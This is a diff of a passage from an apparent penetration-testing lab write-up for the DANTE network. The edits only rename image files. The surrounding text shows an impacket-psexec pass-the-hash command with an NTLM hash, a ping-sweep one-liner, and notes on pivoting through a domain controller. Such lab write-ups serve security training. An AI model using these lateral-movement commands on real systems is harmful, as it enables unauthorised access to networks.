@@ -2957,7 +2957,7 @@ This utility can also be used to pass hashes for authentications
 impacket-psexec DANTE/Administrator@172.16.2.5 -hashes aad3b435b51404eeaad3b435b51404ee:4c827b7074e99eefd49d05872185f7f8
 ```
 
-<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Great, now we can use that one liner ping sweep
 
@@ -2965,7 +2965,7 @@ Great, now we can use that one liner ping sweep
 (for /L %a IN (1,1,254) DO ping /n 1 /w 1 172.16.2.%a) | find "Reply"
 ```
 
-<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 As we can see there is an internal subnet replying. This is good but we have another problem, because the internal subnet can only be accessed through the DC01 machine, we need to pivot again and add a new route. So this is basically triple pivoting
 
